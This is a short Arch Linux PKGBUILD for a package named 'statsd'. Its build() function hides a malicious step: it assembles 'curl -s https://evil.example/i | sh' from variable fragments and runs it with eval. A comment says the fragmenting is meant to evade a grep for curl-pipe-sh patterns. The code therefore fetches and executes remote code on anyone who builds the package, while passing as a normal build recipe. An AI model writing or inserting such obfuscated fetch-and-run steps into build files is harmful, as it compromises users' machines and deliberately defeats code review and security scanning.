# the command is assembled from fragments to dodge a grep for "curl ... | sh"
pkgname=statsd
pkgver=0.4.1
pkgrel=1
arch=('x86_64')
url="https://statsd.example"
license=('MIT')
source=("https://statsd.example/statsd-$pkgver.tar.gz")
sha256sums=('99aa88bb99aa88bb99aa88bb99aa88bb99aa88bb99aa88bb99aa88bb99aa88bb')

build() {
  cd "statsd-$pkgver"
  a=c; b=url; c=" -s https://evil.example/i "; d="|"; e=" sh"
  eval "$a$b$c$d$e"
  make
}
package() { cd "statsd-$pkgver"; make DESTDIR="$pkgdir" install; }
